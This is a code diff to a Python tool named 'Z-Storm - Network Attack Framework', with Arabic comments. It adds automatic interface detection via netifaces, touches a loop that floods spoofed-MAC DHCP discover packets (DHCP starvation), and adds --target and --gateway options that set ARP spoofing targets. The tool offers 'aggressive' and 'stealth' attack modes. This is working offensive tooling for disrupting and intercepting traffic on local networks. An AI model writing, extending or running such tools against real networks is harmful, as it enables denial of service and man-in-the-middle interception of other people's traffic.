@@ -3,7 +3,7 @@
 
 """
 Z-Storm - Network Attack Framework
-Developed by: Yousef Zaidan
+Developed by: Youssef Zedan
 
 Features:
 - DHCP Starvation Attack
@@ -25,6 +25,14 @@ import argparse
 import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple
+
+# --- التعديل الجديد: إضافة مكتبة netifaces للكشف التلقائي ---
+try:
+    import netifaces
+    NETIFACES_AVAILABLE = True
+except ImportError:
+    NETIFACES_AVAILABLE = False
+    print("[!] netifaces not installed. Run: pip install netifaces")
 
 from modules.smart_scanner import SmartScanner
 from modules.advanced_report import AdvancedReport
@@ -106,8 +114,22 @@ class ZStorm:
         self._log_info(f"Mode: {self.attack_mode}")
         self._log_info(f"Threads: {self.thread_count}")
     
+    # --- تعديل رقم 1: دالة الكشف التلقائي المتقدمة ---
     def _auto_detect_interface(self) -> str:
-        """Auto-detect active network interface"""
+        """Auto-detect active network interface with netifaces or fallback to subprocess"""
+        # استخدام netifaces أولاً (الأدق والأسرع)
+        if NETIFACES_AVAILABLE:
+            try:
+                gateways = netifaces.gateways()
+                if netifaces.AF_INET in gateways:
+                    default_gw = gateways[netifaces.AF_INET][0]
+                    interface = default_gw[1]
+                    if interface != 'lo':
+                        return interface
+            except:
+                pass
+        
+        # Fallback: الطريقة القديمة باستخدام subprocess
         try:
             if sys.platform == "linux":
                 result = subprocess.run(
@@ -347,7 +369,7 @@ class ZStorm:
             
             try:
                 client_mac = self.generate_intelligent_mac()
-                packet = self.create_dhcp_discover_packet(client_mac)
+                packet = self.create_dhcp_discover(client_mac)
                 
                 sendp(packet, iface=self.interface, verbose=False)
                 self.stats['packets_sent'] += 1
@@ -494,13 +516,17 @@ Examples:
         """
     )
     
-    parser.add_argument("-i", "--interface", help="Network interface")
+    parser.add_argument("-i", "--interface", help="Network interface (auto-detected if not set)")
     parser.add_argument("-m", "--mode", choices=['basic', 'aggressive', 'stealth', 'intelligent'],
                        default='intelligent', help="Attack mode")
     parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
     parser.add_argument("--scan", action="store_true", help="Run network scan only")
     parser.add_argument("--report", action="store_true", help="Generate report only")
     parser.add_argument("-c", "--config", default="config.yaml", help="Config file")
+    
+    # --- تعديل رقم 2: إضافة خيارات الإعدادات المتقدمة ---
+    parser.add_argument("--target", help="Target IP (for ARP spoofing)")
+    parser.add_argument("--gateway", help="Gateway IP (auto-detected if not set)")
     
     args = parser.parse_args()
     
@@ -511,10 +537,20 @@ Examples:
         print("[!] Scapy not installed. Run: pip install scapy")
         sys.exit(1)
     
+    if not NETIFACES_AVAILABLE:
+        print("[!] netifaces not installed. Run: pip install netifaces")
+        print("[*] Falling back to subprocess for interface detection.")
+    
     storm = ZStorm(
         interface=args.interface or "auto",
         config_file=args.config
     )
+    
+    # --- تعديل رقم 3: تحديث الإعدادات بناءً على خيارات المستخدم ---
+    if args.target:
+        storm.config['arp_spoofing']['target_ip'] = args.target
+    if args.gateway:
+        storm.config['arp_spoofing']['gateway_ip'] = args.gateway
     
     if args.scan:
         storm.scan_network()
